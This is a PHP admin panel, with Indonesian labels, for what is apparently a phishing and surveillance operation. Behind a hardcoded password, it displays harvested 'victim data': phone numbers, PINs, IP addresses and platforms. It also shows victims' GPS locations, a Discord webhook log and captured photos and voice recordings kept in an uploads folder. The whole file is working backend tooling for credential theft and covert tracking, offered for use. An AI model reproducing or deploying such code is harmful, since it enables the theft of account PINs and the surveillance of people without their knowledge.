<?php
// Proteksi dengan password
$password = "lifx unlock";
if(!isset($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_PW'] != $password) {
    header('WWW-Authenticate: Basic realm="Admin Panel"');
    header('HTTP/1.0 401 Unauthorized');
    echo 'Access Denied';
    exit;
}

// Baca semua data
$logs = file_exists('logs.txt') ? file_get_contents('logs.txt') : 'Belum ada data';
$locations = file_exists('locations.txt') ? file_get_contents('locations.txt') : 'Belum ada lokasi';
$discordLog = file_exists('discord_log.txt') ? file_get_contents('discord_log.txt') : 'Belum ada log Discord';

// Hitung total data
$totalData = substr_count($logs, "\n");
$totalLocations = substr_count($locations, "\n");

// Parse logs ke array
$dataArray = [];
$lines = explode("\n", trim($logs));
foreach($lines as $line) {
    if(empty($line)) continue;
    preg_match('/\[(.*?)\] (.*?) \| (.*?) \| (.*?) \| (.*?) \| (.*)/', $line, $matches);
    if(count($matches) >= 6) {
        $dataArray[] = [
            'time' => $matches[1],
            'phone' => $matches[2],
            'pin' => $matches[3],
            'platform' => $matches[4],
            'ip' => $matches[5],
            'ua' => $matches[6]
        ];
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Admin Panel - LIFX System</title>
    <meta charset="UTF-8">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Courier New', monospace; background: #0a0e27; color: #00ff88; padding: 20px; }
        h1, h2 { margin-bottom: 20px; }
        .stats { background: #1a1f3a; padding: 20px; border-radius: 10px; margin-bottom: 20px; display: flex; gap: 20px; flex-wrap: wrap; }
        .stat-card { background: #0a0e27; padding: 15px; border-radius: 10px; flex: 1; text-align: center; }
        .stat-card .number { font-size: 36px; font-weight: bold; color: #ff3366; }
        table { width: 100%; border-collapse: collapse; background: #1a1f3a; margin-top: 20px; }
        th, td { border: 1px solid #333; padding: 10px; text-align: left; }
        th { background: #ff3366; color: white; }
        .section { margin-top: 30px; }
        pre { background: #000; padding: 15px; border-radius: 10px; overflow-x: auto; margin-top: 10px; }
        .badge { background: #00ff88; color: #000; padding: 2px 8px; border-radius: 10px; }
        .pin { color: #ffaa00; font-weight: bold; }
    </style>
</head>
<body>
    <h1>🔐 LIFX ADMIN PANEL</h1>
    
    <div class="stats">
        <div class="stat-card">
            <div class="number"><?php echo $totalData; ?></div>
            <p>Total Data Korban</p>
        </div>
        <div class="stat-card">
            <div class="number"><?php echo $totalLocations; ?></div>
            <p>Total Lokasi GPS</p>
        </div>
        <div class="stat-card">
            <div class="number">📸🎤</div>
            <p>Foto + Suara di uploads/</p>
        </div>
    </div>
    
    <div class="section">
        <h2>📱 DATA KORBAN (<?php echo count($dataArray); ?> Record)</h2>
        <table>
            <thead>
                <tr><th>No</th><th>Waktu</th><th>📱 Phone</th><th>🔑 PIN</th><th>🎯 Platform</th><th>🌐 IP</th></tr>
            </thead>
            <tbody>
                <?php $no = 1; foreach(array_reverse($dataArray) as $d): ?>
                <tr>
                    <td><?php echo $no++; ?></td>
                    <td><?php echo htmlspecialchars($d['time']); ?></td>
                    <td><span class="badge"><?php echo htmlspecialchars($d['phone']); ?></span></td>
                    <td class="pin"><?php echo htmlspecialchars($d['pin']); ?></td>
                    <td><?php echo htmlspecialchars($d['platform']); ?></td>
                    <td><?php echo htmlspecialchars($d['ip']); ?></td>
                </tr>
                <?php endforeach; ?>
                <?php if(empty($dataArray)): ?>
                <tr><td colspan="6" style="text-align:center;">Belum ada data</td></tr>
                <?php endif; ?>
            </tbody>
        </table>
    </div>
    
    <div class="section">
        <h2>📍 DATA LOKASI GPS</h2>
        <pre><?php echo htmlspecialchars($locations); ?></pre>
    </div>
    
    <div class="section">
        <h2>🤖 DISCORD WEBHOOK LOG</h2>
        <pre><?php echo htmlspecialchars($discordLog); ?></pre>
    </div>
    
    <div class="section">
        <h2>📁 MEDIA FILES</h2>
        <p>Cek folder <code>uploads/</code> via FTP atau File Manager</p>
        <?php
        if(file_exists('uploads')) {
            $files = scandir('uploads');
            $mediaFiles = array_diff($files, ['.', '..']);
            if(count($mediaFiles) > 0) {
                echo "<ul>";
                foreach($mediaFiles as $file) {
                    echo "<li><a href='uploads/$file' target='_blank'>$file</a></li>";
                }
                echo "</ul>";
            } else {
                echo "<p>Belum ada file media</p>";
            }
        }
        ?>
    </div>
</body>
</html>